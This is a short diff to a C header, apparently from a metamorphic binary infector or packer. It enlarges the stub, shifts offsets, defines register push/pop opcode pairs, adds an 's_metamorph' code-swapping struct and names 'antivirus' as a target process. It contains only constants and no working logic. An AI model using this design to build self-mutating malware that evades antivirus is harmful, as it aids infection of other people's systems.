@@ -34,16 +34,31 @@
 
 #define BUFF_SIZE 0x2000
 #define JUMP_SIZE 0x4
-#define STUB_SIZE 0x16e
+#define STUB_SIZE 0x174
 #define PAGE_SIZE 0x1000
 #define FCNT_SIZE 0x7
+#define CODE_SIZE 0x8
+#define OFFS_SIZE 0x3
 
-#define ADDR_OFFSET 0x4f
-#define SIZE_OFFSET 0x54
+#define ADDR_OFFSET 0x53
+#define SIZE_OFFSET 0x58
 
 #define TARGET "antivirus"
 
 #define DEFAULT_KEY_SIZE 0x8
+
+#define CODE_OFFSET_1 0x19
+#define CODE_OFFSET_2 0x49
+#define CODE_OFFSET_3 0x16d
+
+#define RSP 0x5c54
+#define RBP 0x5d55
+#define RAX 0x5850
+#define RDI 0x5f57
+#define RSI 0x5e56
+#define RDX 0x5a52
+#define RCX 0x5951
+#define RBX 0x5b53
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -114,6 +129,12 @@ struct s_keychain
 {
 	int key[KEY_SIZE];
 	size_t junk[KEY_SIZE][KEY_SIZE];
+};
+
+struct s_metamorph
+{
+	unsigned short code[CODE_SIZE];
+	unsigned int offset[OFFS_SIZE];
 };
 
 ////////////////////////////////////////////////////////////////////////////////
